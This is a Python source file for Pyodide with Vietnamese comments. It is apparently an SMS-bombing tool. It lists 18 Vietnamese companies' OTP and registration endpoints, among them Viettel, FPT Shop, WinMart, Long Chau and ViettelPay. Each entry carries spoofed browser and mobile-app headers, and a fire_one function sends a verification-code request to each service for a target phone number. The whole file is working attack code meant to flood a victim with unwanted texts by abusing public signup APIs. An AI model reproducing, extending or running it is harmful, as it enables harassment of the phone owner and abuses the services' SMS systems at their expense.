"""Danh sách endpoint SMS — gọi trực tiếp, không subprocess.
   Mỗi provider là (name, method, url, headers, body_builder)."""
from js import fetch, Headers, Object
from pyodide.ffi import to_js
import json, re

def _vn(p: str) -> str:
    n = re.sub(r"[^\d+]", "", p)
    if n.startswith("0"):
        return "+84" + n[1:]
    if n.startswith("84"):
        return "+" + n
    return n

def _json_hdr() -> dict:
    return {"content-type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/127.0.0.0 Safari/537.36"}

PROVIDERS = [
    ("sapo", "POST", "https://www.sapo.vn/fnb/sendotp",
     {"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "origin": "https://www.sapo.vn",
      "referer": "https://www.sapo.vn/dang-nhap-kenh-ban-hang.html"},
     lambda p: f"phonenumber={p}"),

    ("viettel", "POST", "https://viettel.vn/api/get-otp",
     {**_json_hdr(), "origin": "https://viettel.vn",
      "referer": "https://viettel.vn/dang-ky",
      "X-Requested-With": "XMLHttpRequest"},
     lambda p: json.dumps({"msisdn": p})),

    ("medicare", "POST", "https://medicare.vn/api/otp",
     {**_json_hdr(), "origin": "https://medicare.vn",
      "referer": "https://medicare.vn/login"},
     lambda p: json.dumps({"mobile": p, "mobile_country_prefix": "84"})),

    ("tv360", "POST", "https://tv360.vn/public/v1/auth/get-otp-login",
     {**_json_hdr(), "origin": "https://tv360.vn",
      "referer": "https://tv360.vn/login"},
     lambda p: json.dumps({"msisdn": p})),

    ("ghn", "POST", "https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp",
     {**_json_hdr(), "origin": "https://sso.ghn.vn",
      "referer": "https://sso.ghn.vn/"},
     lambda p: json.dumps({"phone": p, "type": "register"})),

    ("fptshop", "POST", "https://papi.fptshop.com.vn/gw/is/user/new-send-verification",
     {**_json_hdr(), "apptenantid": "E6770008-4AEA-4EE6-AEDE-691FD22F5C14",
      "order-channel": "1",
      "origin": "https://fptshop.com.vn",
      "referer": "https://fptshop.com.vn/"},
     lambda p: json.dumps({"fromSys": "WEBKHICT", "otpType": "0", "phoneNumber": p})),

    ("winmart", "POST", "https://api-crownx.winmart.vn/iam/api/v1/user/register",
     {**_json_hdr(), "authorization": "Bearer undefined",
      "x-api-merchant": "WCM",
      "origin": "https://winmart.vn",
      "referer": "https://winmart.vn/"},
     lambda p: json.dumps({"firstName": "Nguyen Van A", "phoneNumber": p,
                           "masanReferralCode": "", "dobDate": "2000-01-01",
                           "gender": "Male"})),

    ("lottemart", "POST", "https://www.lottemart.vn/v1/p/mart/bos/vi_bdg/V1/mart-sms/sendotp",
     {**_json_hdr(), "origin": "https://www.lottemart.vn",
      "referer": "https://www.lottemart.vn/signup"},
     lambda p: json.dumps({"username": p, "case": "register"})),

    ("longchau", "POST", "https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification",
     {**_json_hdr(), "order-channel": "1", "x-channel": "EStore",
      "origin": "https://nhathuoclongchau.com.vn",
      "referer": "https://nhathuoclongchau.com.vn/"},
     lambda p: json.dumps({"phoneNumber": p, "otpType": 0, "fromSys": "WEBKHLC"})),

    ("ahamove", "POST", "https://api.ahamove.com/api/v3/public/user/login",
     {**_json_hdr(), "origin": "https://app.ahamove.com",
      "referer": "https://app.ahamove.com/"},
     lambda p: json.dumps({"mobile": p, "country_code": "VN",
                           "firebase_sms_auth": True})),

    ("fahasa", "POST", "https://www.fahasa.com/ajaxlogin/ajax/checkPhone",
     {"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "x-requested-with": "XMLHttpRequest",
      "origin": "https://www.fahasa.com",
      "referer": "https://www.fahasa.com/customer/account/login"},
     lambda p: f"phone={p}"),

    ("vinamilk", "POST", "https://new.vinamilk.com.vn/api/account/getotp",
     {**_json_hdr(), "authorization": "Bearer null",
      "origin": "https://new.vinamilk.com.vn",
      "referer": "https://new.vinamilk.com.vn/account/register"},
     lambda p: json.dumps({"type": "register", "phone": p})),

    ("batdongsan", "GET", "https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister",
     {"accept": "application/json, text/plain, */*",
      "referer": "https://batdongsan.com.vn/sellernet/internal-sign-up"},
     None),

    ("gumac", "POST", "https://cms.gumac.vn/api/v1/customers/verify-phone-number",
     {**_json_hdr(), "origin": "https://gumac.vn",
      "referer": "https://gumac.vn/"},
     lambda p: json.dumps({"phone": p})),

    ("routine", "POST", "https://routine.vn/customer/otp/send/",
     {"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "x-requested-with": "XMLHttpRequest",
      "origin": "https://routine.vn",
      "referer": "https://routine.vn/"},
     lambda p: f"telephone={p}&isForgotPassword=0"),

    ("xanhsm_sms", "POST", "https://api.gsm-api.net/auth/v1/public/otp/send?aud=user_app&platform=ios",
     {**_json_hdr(),
      "User-Agent": "UserApp/3.15.0 (com.gsm.customer; build:89; iOS 17.0.2) Alamofire/5.9.1",
      "app-version-label": "3.15.0", "app-build-number": "89",
      "accept-language": "vi", "platform": "iOS", "aud": "user_app"},
     lambda p: json.dumps({"is_forgot_password": False,
                           "phone": _vn(p), "provider": "VIET_GUYS"})),

    ("xanhsm_zalo", "POST", "https://api.gsm-api.net/auth/v1/public/otp/send?platform=ios&aud=user_app",
     {**_json_hdr(),
      "User-Agent": "UserApp/3.15.0 (com.gsm.customer; build:89; iOS 17.0.2) Alamofire/5.9.1",
      "app-version-label": "3.15.0", "app-build-number": "89",
      "accept-language": "vi", "platform": "iOS", "aud": "user_app"},
     lambda p: json.dumps({"phone": _vn(p), "is_forgot_password": False,
                           "provider": "ZNS_ZALO"})),

    ("viettel_money", "POST", "https://api8.viettelpay.vn/customer/v2/accounts/register",
     {**_json_hdr(),
      "User-Agent": "Viettel Money/8.8.8 (com.viettel.viettelpay; build:3; iOS 17.0.2) Alamofire/4.9.1",
      "app-version": "8.8.8", "product": "VIETTELPAY",
      "type-os": "ios", "accept-language": "vi",
      "authority-party": "APP"},
     lambda p: json.dumps({"identityType": "msisdn",
                           "identityValue": p, "type": "REGISTER"})),
]

async def fire_one(name: str, method: str, url: str, headers: dict,
                   body_builder, phone: str) -> tuple[str, int | str]:
    try:
        h = Headers.new()
        for k, v in headers.items():
            h.set(k, v)
        init = {"method": method, "headers": h}
        if body_builder:
            init["body"] = body_builder(phone)
        if method == "GET":
            url = f"{url}?phoneNumber={phone}"
        resp = await fetch(url, Object.fromEntries(to_js(init)))
        return name, resp.status
    except Exception as e:
        return name, f"ERR:{type(e).__name__}"
